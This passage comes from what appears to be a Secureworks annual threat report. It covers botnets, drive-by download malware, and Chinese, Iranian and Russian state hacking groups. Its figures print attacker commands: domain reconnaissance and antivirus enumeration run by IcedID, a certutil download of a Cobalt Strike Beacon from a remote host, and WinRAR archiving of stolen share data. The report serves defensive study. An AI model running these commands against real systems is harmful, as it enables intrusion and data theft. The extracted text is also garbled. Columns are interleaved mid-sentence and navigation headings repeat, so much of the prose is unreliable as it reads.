October GOLD CRESTWOOD implemented functionality in their 

Emotet malware that was likely intended to identify researcher 

systems and malware sandboxes. However, on November 11, it took 

a four\-month hiatus, only returning for a brief burst of spamming in 

March that lasted until early April.

At the end of August 2023, we also saw the demise of GOLD 

LAGOON’s Qakbot. Thanks to the concerted international law 

enforcement Operation Duck Hunt36, led by the FBI, the botnet 

was rendered inoperable. At 23:27 UTC on August 25, we observed 

the successful takedown through our botnet emulator, detecting 

the Qakbot botnet distributing shellcode to infected devices. The 

shellcode unpacked a custom DLL (dynamic link library) executable 

containing code that cleanly terminates the running Qakbot process 

At approximately the same time as the DLL began neutralizing 

infections, CTU researchers observed GOLD LAGOON's backend 

infrastructure had stopped responding and some infrastructure had 

been replaced. To interact with infected hosts, the replacement 

servers required a certificate that can sign messages. Such efforts 

will make it very hard for GOLD LAGOON to reimplement Qakbot.

Qakbot posed a significant threat to businesses globally. Engineered 

for eCrime, Qakbot infections led to the deployment of some of 

the most sophisticated and damaging ransomware variants. These 

included Conti, ProLock, Egregor, REvil, MegaCortex, and, more 

recently, Black Basta, and collectively resulted in losses to businesses 

in the hundreds of millions of U.S. dollars. The takedown is a 

welcome intervention.

By contrast, the IcedID botnet flourished in the past year, having long 

dispensed with its original purpose of facilitating banking fraud to 

instead provide initial access to a variety of ransomware\-distributing 

threat groups. IcedID is used to deliver additional malware which can 

lead to ransomware deployment; its operator, GOLD SWATHMORE, 

functions as an initial access broker (IAB), selling access to 

compromised systems to numerous ransomware operators. In one 

IcedID infection, which CTU researchers executed in a sandboxed 

environment simulating a corporate network, the threat actor 

deployed Cobalt Strike Beacon 21 hours after the initial compromise. 

IcedID took an unusual hiatus between May 12 and June 7 but has 

been active during most of the rest of the reporting period.

08

Appendix

on infected hosts. The takedown was conducted in such a way that 

Qakbot will not run if the host is restarted. 

2023 State of the Threat: A Year in Review

39

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

01

Letter From Our VP

IcedID Communications

IcedID is distributed as a loader executable that transmits basic 

system profile information to a first\-stage loader C2 server. This 

loader C2 server delivers the encrypted core IcedID module to 

compromised hosts that meet infection criteria as determined 

by the IcedID backend. The downloaded core IcedID module is 

decrypted, saved to disk, loaded into memory, and executed. The 

malware cycles through several hard\-coded C2 servers until it 

establishes a connection. It then requests available updates, new 

C2 servers, and additional commands for execution. IcedID is 

typically instructed to execute several system and network profiling 

commands shortly after infection. The output of these commands 

is transmitted to a C2 server. GOLD SWATHMORE and its affiliates 

use the data to identify high\-value hosts that receive additional 

commands or malware payloads.

\> net group Domain Admins /domain
\> net view /all
\> net view /all /domain
\> nltest /domain\_trusts /all\_trusts
\> nltest /domain\_trusts
\> net config workstation
\> systeminfo
\> ipconfig /all 
\> cmd.exe /c chcp \>\&2
\> WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get
\> /Format:List

Figure 17\. System and network profiling commands executed by IcedID shortly after infection. (Source: Secureworks)

2023 State of the Threat: A Year in Review

40

01

Letter From Our VP

Despite some functional “improvements,” such as Qakbot's addition 

SocGholish lurks on compromised WordPress sites and masquerades 

of the ability to capture screenshots on newly infected systems, the 

as an important software update for web browsers. Potential victims 

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

sophistication level of these botnets has stagnated for years. This 

are carefully selected based on their geolocation and the profile of 

reflects their new simplified mission of establishing a beachhead on 

their system including its membership within an Active Directory 

corporate networks to be quickly used for ransomware delivery. Many 

network. These factors are used by threat actors to identify high\-

botnets have abandoned the so\-called consumer space entirely in 

value victims earlier in the kill chain.

recent years by refusing to execute malware in any environment 

where the infected system is not joined with an Active Directory 

domain (see figure 18\).

Innovations in TTPs Occur 

04

When Infection Chains Are 

Drive\-by downloads are malicious files unexpectedly delivered 

Forced to Evolve

through a web browser, either when the victim was not expecting to 

Drive\-By Downloads

download a file at all, or when the file that they intended to download 

turned out to have been modified to execute malicious code. The 

last six quarters of Secureworks incident response data shows a 

steady increase in drive\-by downloads as an initial access vector 

(IAV). CTU researchers have witnessed a surge in the past year in 

drive\-by downloads used as an initial access vector for ransomware 

attacks. Two large\-scale threats delivering these downloads are 

SocGholish and Gootloader. Both threats convince a potential victim 

into downloading a JavaScript file that profiles their local system and 

contacts a C2 server for additional malware to execute. 

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 18\. Malicious SocGholish JavaScript injected into compromised 
websites. (Source: Secureworks)

2023 State of the Threat: A Year in Review

41

01

Letter From Our VP

on a vast network of SEO poisoned search phrases, in many cases 

reported37 to have updated their code. CTU researchers saw it 

Gootloader similarly lurks on compromised WordPress sites and relies 

From late 2022, the Gootloader operator GOLD ZODIAC was widely 

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

law\-themed, to drive victims towards their malware. On numerous 

delivering the second stage payload as a PowerShell script earlier in 

occasions in 2022, CTU researchers observed Gootloader drive\-by 

the year. For example, in one engagement worked by Secureworks 

download compromises resulting in the delivery of Cobalt Strike. The 

incident responders, a user downloaded a ZIP file disguised as 

Gootloader code was buried within a large, legitimate but trojanized 

safety information, resulting in Gootloader delivery. Examination of 

JavaScript jQuery file. If the infected host was joined to an Active 

the victim's logs revealed PowerShell execution before hands\-on 

Directory domain, Gootloader attempted to retrieve and execute a 

keyboard activity involving Cobalt Strike took place.

second\-stage script containing a payload such as Cobalt Strike and a 

small DLL to load the payload. 

Gootloader has also reportedly38 been introducing long execution 

delays by means of code loops that mean a victimized system 

does not display artifacts of infection until hours or days after initial 

compromise.

Figure 19\. Encoded payload written to registry key by Gootloader second\-
stage script. (Source: Secureworks)

Figure 20\. Decoded and formatted PowerShell command from script delivered 
by Gootloader reflectively loading DLL from registry. (Source: Secureworks)

2023 State of the Threat: A Year in Review

42

05
State\-Sponsored 
Threat Activity

While many other countries, including India and Pakistan, conduct 

hostile state\-sponsored cyber activity, CTU researchers primarily 

focus on China, Russia, Iran, and North Korea as they cause the most 

impact to our clients. The primary driver of state\-sponsored threat 

group activity on the part of these countries (and others) continues 

to be geopolitical considerations. 

In particular, the war in Ukraine has been the main focus of Russian 

activity. China too has shifted part of its attention towards Eastern 

Europe, although Taiwan and China's near neighbors remain a 

preoccupation. Iran has maintained its focus on dissident activity, 

its attempts to hinder the progress of the Abraham Accords across 

Arab neighbors, and on Western intentions towards renegotiations 

of nuclear accords. As well as cyberespionage, North Korea remains 

intent on revenue generation, targeting multiple countries to do so.

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

43

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

CHINA 

A Strategic Threat

Main motivations: 

Espionage

Intellectual Property

Theft

2023 State of the Threat: A Year in Review

44

 
 
 
01

Letter From Our VP

CHINA

02

03

Executive Summary 

and Key Findings

Chinese threat groups are placing a growing emphasis on stealthy 

CTU researchers have observed Chinese threat actors using 

tradecraft to achieve their objectives in cyberespionage attacks. The 

commercial tools such as Cobalt Strike to minimize the risk of 

three pillars of this tradecraft are the use of proxy infrastructure, 

attribution if they are caught and to blend in with post\-intrusion 

The Business of Cybercrime—

living off the land through using native operating system tools, and 

ransomware groups that often use these tools. Some Chinese threat 

Is Boomtime Back?

the ability to adapt their approach as potential target organizations 

groups also appear to adjust tradecraft when returning to a target 

increasingly move to cloud\-based solutions.

network after previously being evicted, showing they are adaptable 

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Chinese Cyberespionage 
Tradecraft Stresses Operational 
Security and Stealth

Chinese threat groups have in the past had a reputation for 

“smash\-and\-grab” intrusions, where the emphasis was on achieving 

objectives on the network as quickly as possible with little 

consideration for detection and attribution. However, a growing 

number of Chinese threat groups have demonstrated an increasing 

focus on stealth and operational security in their intrusions and 

command and control (C2\) infrastructure. These tradecraft 

improvements have likely been driven in part by a series of high\-

profile Department of Justice indictments of Chinese nationals 

allegedly involved in cyberespionage activity. Other drivers include 

public exposure by security vendors of this type of activity, and the 

consequential likely increased pressure from Chinese leadership to 

avoid public scrutiny of its cyberespionage activity. 

and goal\-oriented. On some occasions, they may also focus their 

exploitation on non\-Windows devices, where EDR agents may be 

less likely to be deployed.

CTU researchers have increasingly observed Chinese threat groups 

demonstrating careful consideration for operational security over the 

past few years including the use of living off the land tools and a C2 

proxy network built on compromised SOHO routers. This consistent 

attention to operational security also includes leaving a minimal 

intrusion footprint and incorporating defense evasion techniques. 

This focus doesn't just contrast with China's historical reputation, 

it also demonstrates a heightened level of operational maturity and 

adherence to a blueprint designed to reduce the likelihood of the 

detection and attribution of its intrusion activity.

2023 State of the Threat: A Year in Review

45

Executive Summary 

and Key Findings

CTU researchers have seen multiple examples of the Chinese 

They used the Cobalt Strike Beacon to execute domain\-wide 

tradecraft described in this section during Secureworks incident 

reconnaissance commands including running the net view 

response engagements. Here are three typical examples:

command to list the resources in a network share hosted on a 

01

Letter From Our VP

Stealth in Action—Observations 
from IR Engagements

02

03

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

01

During a May 2022 incident response engagement, 

Secureworks analysts observed a Chinese threat actor 

compromise an organization's network with the intent to steal 

intellectual property. The threat actor primarily used native 

operating system tools (a technique known as “living off the 

Forced to Evolve

land”) to achieve their objectives, as well as a command\-and\-

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

control proxy network that included compromised SOHO 

routers.

The threat actor exploited a vulnerable Pulse Secure device 

as the initial access vector, deployed a variant of the Awen 

web shell and the Godzilla web shell to a second server in the 

environment, and then conducted reconnaissance commands 

such as whoami, hostname, and net group. They then used the 

certutil command to download a Cobalt Strike Beacon payload 

(see figure 21\).

08

Appendix

certutil \-urlcache \-f http:// 7/sv

Figure 21\. Certutil command to download Cobalt Strike Beacon. 
(Source: Secureworks)

server that stores the organization's intellectual property. The 

threat actor used the WinRAR utility to compress files stored 

within this share (see figure 22\).

.svm a \-r .tmp "\\\\ \\" \-hp

Figure 22\. WinRAR commands to archive data from network share. 
(Source: Secureworks)

2023 State of the Threat: A Year in Review

46

01

Letter From Our VP

02

During an incident response engagement that took place in 

This particular intrusion not only reinforces the fundamental 

Fall 2022, CTU researchers observed a Chinese threat actor 

need for network defenders to understand and mitigate risks 

moving from a compromised on\-premises network to the 

based on changing attack surfaces, but also demonstrates the 

02

03

Executive Summary 

and Key Findings

organization's Azure Active Directory (AD) tenant, using 

importance of extensive logging. CTU researchers strongly 

techniques that could only be detected via one specific 

recommend that organizations collect appropriate Azure 

Microsoft log. The threat actor had obtained access to the 

AD logs to detect unusual activity in their Azure AD tenant, 

organization's on\-premises network from as early as Summer 

and audit Azure AD applications for unusual and excessive 

The Business of Cybercrime—

Is Boomtime Back?

2021 after exploiting the ProxyShell vulnerabilities in an 

permissions.

internet\-facing Microsoft Exchange server. Secureworks 

incident responders discovered that in Fall 2022 the threat 

In this specific case, the only way to observe much of the 

actor created multiple accounts in the organization's on\-

threat actor's activity during the attack was through study of 

premises AD domain and compromised an existing Azure AD 

the MailItemsAccessed39 mailbox\-auditing action, which is part 

administrator account. The threat actor used the administrator 

of Microsoft's premium audit functionality. The importance 

account to add an impersonation role for Microsoft Exchange 

of being able to observe MailItemsAccessed events was also 

to an account they had created, and then registered a single\-

stressed by CISA as part of an advisory about a June 2023 

tenant application within the Azure AD tenant and configured 

incident in which a state\-sponsored threat actor compromised 

the application to provide access to the organization's 

a Microsoft 365 (M365\) cloud environment of a Federal Civilian 

Exchange Online mailboxes (see figure 23\). 

Executive Branch (FCEB) agency. The advisory stated, “CISA 

and FBI are not aware of other audit logs or events that would 

have detected this activity.”

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 23\. Malicious application API permissions in Azure AD portal. 
(Source: Secureworks)

2023 State of the Threat: A Year in Review

47

03

One threat group has provided prime examples across multiple 

Secureworks incident responders observed the threat actors 

IR engagements since 2021 of tradecraft designed to evade 

using 7\-Zip to create an archive file containing the SYSTEM 

detection and attribution of their intrusion activity and to blend 

registry hive and ntds.dit, likely for exfiltration. A few days 

in with legitimate network activity: BRONZE SILHOUETTE.

later, the threat actors moved laterally to a ManageEngine 

During a Summer 2022 engagement, Secureworks incident 

One command revealed BRONZE SILHOUETTE searching for 

responders discovered that BRONZE SILHOUETTE had 

one of its C2 IP addresses in the victim's access logs, possibly 

deployed a single web shell to multiple servers across the 

suggesting a desire to remove evidence of the intrusion.

ADSelfService Plus server and ran reconnaissance commands. 

environment after exploiting an internet\-facing PRTG Network 

Monitor server.

A CTU investigation into the attacker\-controlled C2 

infrastructure revealed at least three Paessler PRTG servers 

The threat actor used WMI to execute the native vssadmin 

belonging to other organizations. This discovery suggests that 

command on a domain controller to create a volume shadow 

BRONZE SILHOUETTE targets vulnerable PRTG servers for 

copy (see figure 24\). They then extracted the ntds.dit AD 

initial access into a target environment and to establish its C2 

database and the SYSTEM registry hive from the volume 

infrastructure when conducting cyberespionage attacks.

shadow copy.

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

Figure 24\. Threat actor WMI commands to extract the ntds.dit database. 
(Source: Secureworks)

08

Appendix

Figure 25\. Threat actor commands run under the ManageEngine Java 
process. (Source: Secureworks)

2023 State of the Threat: A Year in Review

48

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

BRONZE PRESIDENT, Watching 
the War from the Sidelines

Prior to 2022, BRONZE PRESIDENT focused its efforts on Asia, 

mainly Myanmar and Vietnam. However, since Russia's invasion of 

Ukraine on February 24, 2022, its focus has shifted to obtaining 

political intelligence surrounding the ongoing war. The threat group 

consistently employs decoy documents that relate to political issues 

in the countries surrounding Ukraine, as well as Europe more widely, 

whilst targeting government officials and various national foreign 

ministries.

Since the invasion, CTU researchers observed multiple examples 

of BRONZE PRESIDENT's use of PlugX malware to collect relevant 

information. During 2022, the group used malicious shortcut (LNK) 

files to deliver their malware and continued to use DLL side\-loading. 

However, techniques varied. 

For example, analysis of the LNK files used in June/July 2022 and 

October 2022 campaigns showed the LNK file pointing to a copy 

of the legitimate Adobe Acrobat Distiller executable file, which 

was renamed and used to sideload a highly obfuscated DLL loader. 

The file imported a highly obfuscated malicious DLL, which then 

loaded an encrypted payload file. However, the malware author 

chose different (and in each case quite novel) functions to abuse 

for the shellcode loading, suggesting that the group continuously 

experiments with different approaches to evasion of host\-based 

security agents.

Figure 26\. An example of a topically named LNK file (“Political Guidance for 
the new EU approach towards Russia,”) showing a nested hidden directory 
structure. (Source: Secureworks)

2023 State of the Threat: A Year in Review

49

01

Letter From Our VP

In May 2023, BRONZE PRESIDENT appeared to experiment with 

hiding their payloads inside seemingly benign HTML files (HTML 

smuggling40\) as a new delivery mechanism for PlugX. HTML 

smuggling is typically used by cybercriminals, for example in 

Executive Summary 

and Key Findings

Qakbot campaigns.

02

03

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Also in 2023, BRONZE PRESIDENT diversified their malware 

arsenal, bringing in the previously unobserved MQShell malware. 

MQShell has limited capability; it simply acts as a reverse shell, 

executing commands and passing the output to the C2 server, but 

it may be in the early stages of development. It does employ novel 

C2 communications using the MQTT IoT messaging protocol. The 

threat actor may have chosen this protocol for C2 communications 

as its lightweight publish/subscribe model is simple to use and 

provides an element of obfuscation where the identity of the true 

C2 server is concerned. It may also circumvent network\-based 

detections. To make use of the protocol, the malware author used 

the open\-source MQTT library.

Additionally, while investigating MQShell, CTU researchers 

examined trojanized router firmware files that were likely developed 

by BRONZE PRESIDENT. These files suggest BRONZE PRESIDENT 

may be engaged in building covert networks of compromised 

network devices to tunnel their communications back to China 

unobserved—yet another example of stealthy tradecraft on the 

part of Chinese groups.

2023 State of the Threat: A Year in Review

50

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

IRAN 

Traditional Targeting

Main motivations: 

Espionage

Monitoring dissidents

Sabotage

2023 State of the Threat: A Year in Review

51

 
 
 
01

Letter From Our VP

IRAN 

02

03

Executive Summary 

and Key Findings

A significant proportion of Iranian cyber activity continues to be 

intelligence functions and reportedly43 operates a cyber division. 

driven by political imperatives: tracking and suppression of political 

These organizations only represent a part of the overall contractor 

opposition, countering normalization of relations between Israel and 

network and future research by us and others will likely reveal more.

Arab countries via the Abraham Accords41 and offensive operations 

The Business of Cybercrime—

Is Boomtime Back?

to harass government and commercial entities in Israel. Other foreign 

Indeed, this pattern of private Iranian companies acting as fronts or 

intelligence collection priorities exist but are less prominent within 

providing support for Iranian intelligence operations and attacks is 

our collection aperture.

well established, as illustrated by sanctions dating from:

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Iran's Contractor Ecosystem

Iran's main intelligence services sit within the Ministry of Intelligence 

and Security (also known as MOIS or VAJA) and the Islamic 

Revolutionary Guard Corp (IRGC). Both organizations use a network 

• 201644 on employees of ITSec Team and Mersad Company, 

• 201945 on individuals linked to Net Peygard Samavat 
Company (later known as Emennet Pasargad), 

• 202046 on Rana Intelligence Computing Company and 

some of its employees.

of contractors to support their offensive cyber activities. 

In October 2022, the U.S. Treasury also sanctioned47 Ravin Academy 

for the provision of various cybersecurity services to MOIS and for 

In 2022, CTU research42 into COBALT MIRAGE activity linked three 

training individuals that were later recruited by MOIS.

contractor entities (Afkar System, Najee Technology and Secnerd) 

to Iranian cyber activity, and in particular to the Islamic Revolutionary 

Guard Corp (IRGC), and its subordinate unit the Intelligence 

Organization (IRGC\-IO). The IRGC\-IO is one of Iran's primary 

2023 State of the Threat: A Year in Review

52

01

Letter From Our VP

Links between individuals associated with Iranian threat group 

Over a period of days or weeks, COBALT ILLUSION develops a 

activity and contractor organizations often appear gradually over 

rapport with the target and then attempts to phish credentials or 

Executive Summary 

and Key Findings

time. For example, in 2019 Farzin Karimi was accused by the Green 

deploy malware to the target's computer or mobile device. A case in 

Leakers Telegram channel of being linked to COBALT ULSTER 

July 2022 reported by CERTFA53 included instances of a threat actor 

(Muddywater) activity. In 2022, U.S. CyberCommand called48 

conducting video calls with a target and passing the phishing link via 

COBALT ULSTER a “subordinate element” of MOIS. Farzin went on 

chat.

to co\-found Ravin Academy and was designated by the Treasury 

The Business of Cybercrime—

Is Boomtime Back?

alongside it. 

CTU researchers investigated multiple cases attributed to COBALT 

ILLUSION throughout this year. In one case the threat actors created 

02

03

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

Similarly Behzad Mesri, alleged49 perpetrator of the 2017 HBO hack 

a false persona on Twitter that claimed to work for the Atlantic 

is wanted50 by the FBI in relation to multiple criminal activities. 

Council and used it to contact multiple individuals involved in Middle 

Mesri was the CEO of Net Peygard Samavat Company, sanctioned51 

Eastern political affairs research. The fake persona used the name 

for supporting the IRGC and MOIS. The current incarnation of Net 

Sara Shokouhi54 and decorated their social media profile with images 

Peygard Samavat is known as Emennet Pasargad and has links52 to 

stolen from a psychologist and tarot card reader based in Russia.

multiple strands of Iranian cyber activity.

State\-Sponsored 

Threat Activity

(N)GO Phishing

Phishing and bulk data collection have long been core tactics of 

COBALT ILLUSION operations. In early 2023, CTU researchers 

investigated a case likely involving COBALT ILLUSION that suggested 

05

06

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Some state\-sponsored threat groups are more social than others. 

the group's tactics had evolved. What differentiated it from most 

The Iranian threat group COBALT ILLUSION favors the personal 

previous activity was the hijack of a long\-standing social media 

touch, routinely masquerading as real individuals or creating fake 

account which provided a degree of credibility to the persona in 

social media personas and using them to contact a target under the 

contrast to accounts that are only a few weeks or months old when 

pretext of an interview request, assistance on a report, or to discuss a 

they start approaching targets. In this case, activity involved the use 

shared interest. 

of an existing Twitter account, created in 2013, where the original 

identity had been replaced with a fake persona claiming to be a 

COBALT ILLUSION (also known as Charming Kitten and APT42\) is 

researcher at the Atlantic Council.

suspected of operating on behalf of Iran's Intelligence Organization 

of the Islamic Revolutionary Guard Corp (IRGC\-IO). COBALT 

Social media continues to be a popular mechanism for Iranian 

ILLUSION targets a wide range of individuals and is particularly 

APT groups to approach and cultivate a rapport with their targets. 

interested in academics, journalists, human rights defenders, 

Phishing awareness training that includes scenarios focused on social 

political activists, intergovernmental organizations (IGOs), and non\-

media\-based approaches, whether through professional or personal 

governmental organizations (NGOs) that focus on Iran. 

accounts, can help employees spot and report such activity.

2023 State of the Threat: A Year in Review

53

01

Letter From Our VP

Welcome to the Masquerade Ball

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Iranian use of personas goes far wider and deeper than using 

personas in phishing. Since the Iran\-Iraq war of the 1980s, Iran has 

preferred indirect confrontation, using proxies, created or adopted, 

to conduct kinetic and intelligence operations against regional 

of their offensive cyber capabilities, first through the adoption of 

the indigenous amateur hacker and defacement community to 

conduct attacks, and later in the routine fabrication of criminal and 

hacktivist personas to claim responsibility for attacks. One of the 

Innovations in TTPs Occur 

earliest examples of Iran using fictional personas was the conflicting 

04

When Infection Chains Are 

claims of responsibility released by “Arab Youth Group” and “Cutting 

Forced to Evolve

Sword of Justice” in relation to the 2012 Shamoon wiper attacks in 

Fictional personas, styled as individuals or groups, provide the 

regime with plausible deniability for attacks against their adversaries. 

Beyond that, they serve to further political objectives, such as 

undermining foreign governments, by creating the perception that 

those governments are powerless in the face of cybercriminals 

attacking their citizens or that hacktivists are emerging to support 

The primary target of these campaigns is Israel, but secondary 

targets have included the U.S., UAE, Saudi Arabia, Bahrain, and 

Albania. Many of these are long\-standing Western and regional 

adversaries, but the emergence of the Abraham Accords and the 

prospect of Arab countries normalizing relations with Israel and 

shifting the regional power balance, are also of significant concern 

adversaries. That same strategy carried over into the development 

and amplify particular political causes. 

Saudi Arabia and Qatar. 

to Iran. 

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 27\. Comparison of Moses Staff and Abraham's Ax logos. 
(Source: Secureworks)

2023 State of the Threat: A Year in Review

54

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

The past year has not seen any revival of activity from COBALT 

Peygard Samavat Company, have been a persistent developer of 

FOXGLOVE in the guise of the Pay2Key and N3tw0rm ransomware 

Iranian cyber personas, the associated offensive campaigns, and 

families and group personas that we reported on in the 2021 State 

other intelligence projects on behalf of the Iranian Revolutionary 

of the Threat report55\. However, COBALT SAPLING, the group 

Guard Corp Intelligence Organization (IRGC\-IO), the IRGC\-Electronic 

behind the Moses Staff56 persona, did return. Moses Staff emerged 

Warfare and Cyber Defense Organization (IRGC\-EWCD) and the 

in September 2021, using pro\-Palestinian imagery and messaging 

Ministry of Intelligence and Security (MOIS).

to justify hack and leak attacks on government and commercial 

entities in Israel. Just over a year later, in November 2022, COBALT 

In July 2022, a MOIS connected persona, Homeland Justice, attacked 

SAPLING launched a new campaign and associated persona, 

multiple government entities in Albania, ostensibly due to Albania's 

Abraham's Ax, using pro\-Hezbollah messaging and imagery to leak 

hosting of an Iranian political opposition group, Mojahedin\-e\-Khalq 

data allegedly stolen from government ministries in Saudi Arabia. 

(MEK). However, aspects of the symbolism presented by Homeland 

Beyond hack and leak attacks COBALT SAPLING has used custom 

Justice suggested that attacks were also motivated by the activities 

malware such as PyDCrypt, DCSrv and Strifewater RAT in destructive 

of the anti\-Iranian hacktivist group, Predatory Sparrow58\. 

attacks masquerading as ransomware. In many cases the use of 

ransomware\-style malware appears to be an attempt to disrupt 

In June 2022, Predatory Sparrow had claimed responsibility for 

rather than monetize a target. As of July 2023, COBALT SAPLING is 

cyber\-enabled physical attacks59 on three state\-owned steel mills in 

dormant but may yet be resurrected. 

Iran. Predatory Sparrow is itself a cyber\-persona that provides “cover 

for action” for a state\-sponsored actor. In September 2022, the U.S. 

In November 2021, the U.S. Department of the Treasury's Office of 

designated60 MOIS and specific individuals in response to these 

Foreign Assets Control (OFAC) sanctioned57 six Iranian individuals 

attacks and ongoing leaks of Albanian government data.

and the Iranian company Emennet Pasargad for their role in a cyber\-

enabled campaign to influence the 2020 U.S. presidential election. 

At the time, CTU researchers analyzed the attack and highlighted 

inconsistencies in the promotional material revealing the campaign 

to be a charade. Emennet Pasargad and earlier incarnations of 

the entity under other names including Eeleyanet Gostar and Net 

2023 State of the Threat: A Year in Review

55

01

Letter From Our VP

In January 2023, the DarkBit persona operated by COBALT AZTEC 

targeted organization. At the time of writing no other known DarkBit 

provided an interesting example of a persona evolving after its initial 

attacks have occurred, making it just the latest example of a transient 

appearance, potentially in order to improve or refocus the narrative 

persona associated with Iranian offensive cyber activity. 

for greater impact. 

2022 saw a significant uptick in appearance of Iranian hacktivists 

Initially used in an attack on a commercial entity in a GCC country, 

and criminal cyber personas, and it is likely they will continue to 

DarkBit presented itself as a generic ransomware actor. Within a 

use this tactic. Unlike real criminal and hacktivist groups there is no 

month the persona had been evolved for use in an attack in Israel, 

motivation to create an enduring reputation and narrative for these 

introducing a blend of political and financial motives to the narrative 

transient groups. New personas will be deployed to align with the 

by claiming to oppose apartheid and racism while also suggesting 

latest political objectives, providing a temporary face to their attacks 

the group was composed of disgruntled ex\-employees forced into 

and then fading into the background, obscuring the identities and 

cybercrime by recent layoffs. In Israel at least, COBALT AZTEC was 

intent of the real threat actors. 

assisted by MOIS\-linked COBALT ULSTER in gaining access to the 

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 28\. DarkBit ransomware payment portal as of early January 2023\. (Source: Secureworks)

2023 State of the Threat: A Year in Review

56

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

RUSSIA 

The Near Abroad and a Nod 
to the “Problems” of Cybercrime

Main motivations: 

Espionage

Hybrid Warfare

2023 State of the Threat: A Year in Review

57

 
 
01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

RUSSIA

Inside Ukraine, Russia's activity has primarily fallen into two camps: 

In early 2023, CTU researchers observed IRON TWILIGHT exploiting 

cyberespionage and disruption, primarily via the use of wiper attacks 

Outlook vulnerability CVE\-2023\-23397 to collect NTLM credential 

on Ukrainian infrastructure and institutions. Outside Ukraine, the 

hashes in multiple phishing campaigns that targeted various 

focus has been on gaining intelligence on countries supporting 

Ukrainian state agencies. Recovered hashes could be used in a Pass\-

Ukraine, assisted by short\-lived denial of service attacks conducted 
by multiple pro\-Russian hacktivist groups. 

the\-Hash attack to authenticate as the victim to other systems, 

access which is valuable for other follow\-on activities including 

intelligence gathering. 

IRON TILDEN, a threat group likely working on behalf of Russia's 

domestic intelligence services, remained focused on espionage 

through highly targeted spearphishing of Ukrainian defense and 

government organizations. Infrastructure and lure documents 

attributed by CTU researchers in early 2023 to IRON TILDEN 

indicated little change in targeting and a continued preference 

for certain intrusion techniques like remote template injection for 

defense evasion and fast\-flux DNS for command and control.

Espionage and Disruption—
Russia's offensive cyber priorities 
in Ukraine 

Russia's protracted invasion of Ukraine entered its second year with 

